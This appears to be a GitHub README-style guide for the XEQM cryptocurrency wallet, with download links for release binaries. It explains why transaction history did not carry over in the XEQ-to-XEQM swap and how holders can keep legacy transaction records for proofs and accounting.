![XEQM WALLET](assets/banner-article.png)

# XEQM swap history was not migrated

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

The XEQ to XEQM swap moved balances, not transaction history. When legacy XEQ was burned and the equivalent XEQM minted, the new coins arrived on a chain that had never seen the old wallet's payments  -  so the receiving address began its history at the migration, and nothing before it is visible on the current chain.

## What "history" means here

History is the record of which outputs moved where, in which block, with which identifiers. It belongs to the chain that recorded it, not to the wallet that displayed it.

The migration created new outputs on a new chain. The old outputs were burned, which is a transaction on the legacy chain, and the new outputs were minted, which is a transaction on the current one. Neither chain contains the other's record.

## Why the graph cannot move

A blockchain's history is the chain of blocks and the transactions inside them. Copying it would mean copying the blocks, and the current network has its own.

So a migrated holder keeps two records in two places: the legacy chain, frozen at the point of the burn, and the current chain, which starts at the mint. The wallet can only show the chain it is connected to.

## What this costs you in practice

Nothing in money. The balance is complete and spendable, and the wallet calculates it from the outputs that exist on the current chain.

It costs something in evidence. A payment made before the migration cannot be proved with a proof generated on the current chain, because that proof would name a transaction the current chain has never seen. [Verify an XEQM transaction proof](https://github.com/XEQMFoundation/account-guide/blob/main/verify-xeqm-transaction-proof.md) covers what a proof actually asserts.

## Keeping a record of the legacy side

Before the legacy wallet is retired, export what you need: the addresses, the transaction identifiers of payments that matter, and the burn transaction that converted the balance. Those identifiers are the only durable reference to the old chain.

Screenshots are weaker evidence than identifiers, and a wallet file is not a record at all. Write down the identifiers, keep the burn transaction's identifier with them, and store the set with your other financial records.

## What the legacy wallet still does

The older XEQ GUI talks to the legacy chain and shows what is left there. If you kept it, it remains a window onto that chain rather than a route into the current one.

Do not confuse the two when you open a wallet file from years ago. A wallet that shows no current balance may simply be pointed at the old chain. [XEQM GUI vs the legacy XEQ GUI](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-gui-vs-legacy-wallet.md) covers the difference between the two products.

## Addresses after a migration

The address you supplied for the mint is the address the current wallet shows. It did not exist on the current chain before the migration, so any history attached to it begins there.

That is why a block explorer shows a short page for an address that has years of use behind it. The years are on the other chain, and the explorer is not lying  -  it is reading the chain it was pointed at.

## Accounting and tax records

If you need a record for an accountant, treat the two chains as two sets of records rather than one. The legacy side records what you held and the burn; the current side records the mint and everything after it.

The burn transaction is the link between them, and it is the document that explains why the new balance appeared. Keep its identifier with the date of the operation and the amount converted. [Migrate from XEQ to XEQM](https://github.com/XEQMFoundation/custody-and-protection/blob/main/migrating-from-xeq-to-xeqm.md) covers how the swap worked.

## What a block explorer can and cannot tell you

An explorer reads one chain. Point it at the current one and it shows the mint and everything after; point it at the legacy chain and it shows the old payments and the burn. Neither view is wrong, and neither is complete.

That is why a link to an explorer is a poor answer to "where did my history go". The correct answer names which chain the link reads, and a reader who does not know there are two will conclude that their record was deleted.

## Why the wallet cannot simply show both

Showing two chains in one balance would mean trusting a second source and adding two numbers that may not be comparable. The wallet reads one chain and reports what it sees, which is the only claim it can actually verify.

That restraint is useful when you are reconciling records: the wallet's number is authoritative for the chain it reads, and everything else belongs in your own archive.

## Reconciling a balance across the migration

Start from the current chain and work backwards. The wallet's balance is the sum of outputs that exist now, which is the number that matters for spending. Then add the burn transaction as the explanation of where that balance came from.

If the two numbers differ, the difference is not an error in the wallet: it is the interval between the burn and the mint, or a later transaction that changed the balance. Reconcile against the current chain's own history first, and treat the legacy side as the opening entry.

## What the current wallet can and cannot show

It shows the current chain: balance, transactions, subaddresses, proofs, and the network statistics around them. It cannot show legacy transactions, and there is no setting that makes it.

That is not a gap to work around. A wallet that displayed another chain's history would be making claims it could not verify. [What is XEQM WALLET](https://github.com/XEQMFoundation/account-guide/blob/main/what-is-xeqm-wallet.md) covers what the application is responsible for.

## If you need to prove an old payment

Use the legacy chain's own record: the transaction identifier, and an explorer or archive that still reads that chain. A proof generated on the current chain cannot describe a legacy transaction, and a screenshot of one is a picture rather than evidence.

The same principle applies in reverse: a legacy wallet cannot prove a payment made after the migration. [Is the XEQ swap still open](https://github.com/XEQMFoundation/custody-and-protection/blob/main/is-the-xeq-swap-to-xeqm-open.md) covers the status of the swap itself.

## What this means for a proof you kept

A proof generated on the legacy chain still describes a legacy transaction, and it stays valid for as long as that chain is readable. It simply is not a proof of anything on the current chain.

That is worth knowing before you delete an old record because the wallet no longer shows it. The wallet's view is limited to the chain it reads; your archive is not.

## What to tell someone who asks why the history is short

Say that the balance migrated at one to one and the history did not, because history belongs to the chain that recorded it. That is a complete explanation, and it is more reassuring than it sounds: the money is all there, and the record is split across two chains that each kept their own.

If they are checking a payment rather than an account, give them the transaction identifier from the chain where it happened.

## Frequently asked questions

### Did my balance migrate?

Yes, at one to one. The swap burned legacy XEQ and minted the equivalent XEQM.

### Why is my address history empty?

The address began on the current chain at the migration. Anything before that is recorded on the legacy chain.

### Can I merge the two histories?

Not in a wallet. They are separate chains with separate records, and no tool can combine them into one verifiable history.

### Do I lose anything by not having the old history?

Not the funds. You lose the convenience of one continuous record, which is why the old transaction identifiers and the burn transaction are worth keeping.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [Migrate from XEQ to XEQM](https://github.com/XEQMFoundation/custody-and-protection/blob/main/migrating-from-xeq-to-xeqm.md)
- [Is the XEQ swap still open](https://github.com/XEQMFoundation/custody-and-protection/blob/main/is-the-xeq-swap-to-xeqm-open.md)
- [XEQM swap status expired](https://github.com/XEQMFoundation/custody-and-protection/blob/main/xeqm-swap-status-expired.md)
